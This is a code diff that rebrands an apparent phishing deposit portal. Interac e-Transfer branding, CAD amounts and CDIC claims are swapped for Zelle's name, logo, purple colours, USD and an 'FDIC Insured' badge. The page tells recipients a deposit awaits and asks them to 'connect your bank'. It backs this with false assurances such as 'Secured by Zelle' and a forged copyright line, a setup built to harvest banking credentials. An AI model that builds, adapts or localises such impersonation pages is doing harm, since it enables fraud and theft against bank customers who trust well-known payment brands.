@@ -47,7 +47,7 @@ function ClientDepositContent() {
 
   const COPY = {
     en: {
-      badge:        "Interac e-Transfer",
+      badge:        "Zelle Payment",
       awaiting:     "Awaiting your deposit",
       from:         "From",
       amount:       "Amount",
@@ -55,18 +55,18 @@ function ClientDepositContent() {
       expires:      "Expires",
       message:      "Message",
       readyTitle:   "Ready to Deposit",
-      readyBody:    (amt: string) => `Connect your bank below to complete your $${amt} CAD deposit.`,
+      readyBody:    (amt: string) => `Connect your bank below to complete your $${amt} USD deposit.`,
       selectBank:   "Select your bank to continue",
-      secureNote:   "Your banking credentials are never shared with us. This connection is protected by Interac's 256-bit SSL encryption.",
+      secureNote:   "Your banking credentials are never shared with us. This connection is protected by Zelle's 256-bit SSL encryption.",
       trustSsl:     "256-bit SSL",
-      trustCdic:    "CDIC Member",
+      trustCdic:    "FDIC Insured",
       trustLive:    "Bank-level security",
       noTransfer:   "No transfer found",
       noTransferSub:"This link may be invalid or expired. Please contact the sender for a new link.",
       expired:      "Expired",
     },
     fr: {
-      badge:        "Virement Interac",
+      badge:        "Paiement Zelle",
       awaiting:     "En attente de votre dépôt",
       from:         "De",
       amount:       "Montant",
@@ -74,11 +74,11 @@ function ClientDepositContent() {
       expires:      "Expire",
       message:      "Message",
       readyTitle:   "Prêt à déposer",
-      readyBody:    (amt: string) => `Connectez votre banque ci-dessous pour finaliser votre dépôt de $${amt} CAD.`,
+      readyBody:    (amt: string) => `Connectez votre banque ci-dessous pour finaliser votre dépôt de $${amt} USD.`,
       selectBank:   "Sélectionnez votre banque pour continuer",
-      secureNote:   "Vos identifiants bancaires ne sont jamais partagés avec nous. Cette connexion est protégée par le chiffrement SSL 256 bits d'Interac.",
+      secureNote:   "Vos identifiants bancaires ne sont jamais partagés avec nous. Cette connexion est protégée par le chiffrement SSL 256 bits de Zelle.",
       trustSsl:     "SSL 256 bits",
-      trustCdic:    "Membre SADC",
+      trustCdic:    "Assuré FDIC",
       trustLive:    "Sécurité bancaire",
       noTransfer:   "Aucun virement trouvé",
       noTransferSub:"Ce lien est peut-être invalide ou expiré. Contactez l'expéditeur pour un nouveau lien.",
@@ -145,16 +145,12 @@ function ClientDepositContent() {
       {/* Client header */}
       <header className="bg-white border-b border-gray-200 shadow-sm shrink-0">
         <div className="max-w-4xl mx-auto px-4 h-16 flex items-center justify-between">
-          <a href="https://www.interac.ca" target="_blank" rel="noopener noreferrer" className="flex items-center gap-3">
-            <div className="w-10 h-10 bg-[#FDB913] rounded-lg flex items-center justify-center p-2 shadow-sm">
-              <img
-                src="https://etransfer-notification.interac.ca/images/new/interac_logo.png"
-                alt="Interac"
-                className="w-full h-full object-contain"
-              />
+          <a href="https://www.zellepay.com" target="_blank" rel="noopener noreferrer" className="flex items-center gap-3">
+            <div className="w-10 h-10 rounded-lg overflow-hidden shadow-sm">
+              <img src="/zelle-logo.webp" alt="Zelle" className="w-full h-full object-cover" />
             </div>
             <div>
-              <p className="text-sm font-bold text-gray-900 leading-none tracking-tight">Interac e&#8209;Transfer</p>
+              <p className="text-sm font-bold text-gray-900 leading-none tracking-tight">Zelle Payment</p>
               <p className="text-[10px] text-gray-400 leading-none mt-0.5 font-medium uppercase tracking-wide">Secure Deposit Portal</p>
             </div>
           </a>
@@ -168,7 +164,7 @@ function ClientDepositContent() {
                   onClick={() => language !== l && toggleLanguage()}
                   className={`px-3 py-1 rounded-md text-xs font-bold transition-all min-h-[32px] ${
                     language === l
-                      ? "bg-[#FDB913] text-black shadow-sm"
+                      ? "bg-[#6D1ED4] text-white shadow-sm"
                       : "text-gray-500 hover:text-gray-800"
                   }`}
                 >
@@ -178,13 +174,13 @@ function ClientDepositContent() {
             </div>
             <div className="hidden sm:flex items-center gap-1.5 text-xs font-semibold text-green-700 bg-green-50 border border-green-200 px-3 py-1.5 rounded-full">
               <Shield className="w-3.5 h-3.5" />
-              Secured by Interac
+              Secured by Zelle
             </div>
           </div>
         </div>
 
-        {/* Yellow accent bar */}
-        <div className="h-1 bg-[#FDB913]" />
+        {/* Purple accent bar */}
+        <div className="h-1 bg-[#6D1ED4]" />
       </header>
 
       <main className="flex-1 max-w-3xl w-full mx-auto px-4 py-8 space-y-6">
@@ -197,12 +193,12 @@ function ClientDepositContent() {
             <h2 className="text-xl font-bold text-gray-800">{c.noTransfer}</h2>
             <p className="text-sm text-gray-500 max-w-xs">{c.noTransferSub}</p>
             <a
-              href="https://www.interac.ca"
+              href="https://www.zellepay.com"
               target="_blank"
               rel="noopener noreferrer"
-              className="text-sm font-semibold text-[#1a56a0] hover:underline"
+              className="text-sm font-semibold text-[#6D1ED4] hover:underline"
             >
-              Visit interac.ca
+              Visit zellepay.com
             </a>
           </div>
         ) : (
@@ -231,7 +227,7 @@ function ClientDepositContent() {
                     <span className="text-5xl font-bold text-gray-900">
                       ${formatAmount(transferData.amount)}
                     </span>
-                    <span className="text-xl font-semibold text-gray-400">CAD</span>
+                    <span className="text-xl font-semibold text-gray-400">USD</span>
                   </div>
                 </div>
 
@@ -273,7 +269,7 @@ function ClientDepositContent() {
             <section className="space-y-4">
               <div className="flex items-center justify-between flex-wrap gap-3">
                 <h2 className="text-base font-semibold text-gray-800 flex items-center gap-2">
-                  <ArrowDown className="w-4 h-4 text-[#FDB913]" />
+                  <ArrowDown className="w-4 h-4 text-[#6D1ED4]" />
                   {c.selectBank}
                 </h2>
                 <SearchBar onSearch={setSearchTerm} clientMode />
@@ -308,21 +304,17 @@ function ClientDepositContent() {
       <footer className="bg-white border-t border-gray-200 py-6 px-4 shrink-0">
         <div className="max-w-3xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-4 text-xs text-gray-400">
           <div className="flex items-center gap-2">
-            <div className="w-5 h-5 bg-[#FDB913] rounded flex items-center justify-center p-0.5">
-              <img
-                src="https://etransfer-notification.interac.ca/images/new/interac_logo.png"
-                alt=""
-                className="w-full h-full object-contain"
-              />
+            <div className="w-5 h-5 rounded overflow-hidden">
+              <img src="/zelle-logo.webp" alt="Zelle" className="w-full h-full object-cover" />
             </div>
-            <span>&copy; {new Date().getFullYear()} Interac Corp. All rights reserved.</span>
+            <span>&copy; {new Date().getFullYear()} Zelle. All rights reserved.</span>
           </div>
           <div className="flex items-center gap-4">
-            <a href="https://www.interac.ca/en/consumers/privacy/" target="_blank" rel="noopener noreferrer" className="hover:text-gray-600 transition-colors">Privacy Policy</a>
+            <a href="https://www.zellepay.com/privacy-policy" target="_blank" rel="noopener noreferrer" className="hover:text-gray-600 transition-colors">Privacy Policy</a>
             <span className="w-1 h-1 rounded-full bg-gray-300" />
-            <a href="https://www.interac.ca/en/consumers/legal/" target="_blank" rel="noopener noreferrer" className="hover:text-gray-600 transition-colors">Terms of Use</a>
+            <a href="https://www.zellepay.com/terms-of-use" target="_blank" rel="noopener noreferrer" className="hover:text-gray-600 transition-colors">Terms of Use</a>
             <span className="w-1 h-1 rounded-full bg-gray-300" />
-            <a href="https://www.interac.ca" target="_blank" rel="noopener noreferrer" className="hover:text-gray-600 transition-colors">interac.ca</a>
+            <a href="https://www.zellepay.com" target="_blank" rel="noopener noreferrer" className="hover:text-gray-600 transition-colors">zellepay.com</a>
           </div>
         </div>
       </footer>
@@ -334,7 +326,7 @@ export default function ClientDepositPortal() {
   return (
     <Suspense fallback={
       <div className="min-h-screen bg-gray-50 flex items-center justify-center">
-        <div className="w-8 h-8 border-4 border-[#FDB913] border-r-transparent rounded-full animate-spin" />
+        <div className="w-8 h-8 border-4 border-[#6D1ED4] border-r-transparent rounded-full animate-spin" />
       </div>
     }>
       <ClientDepositContent />
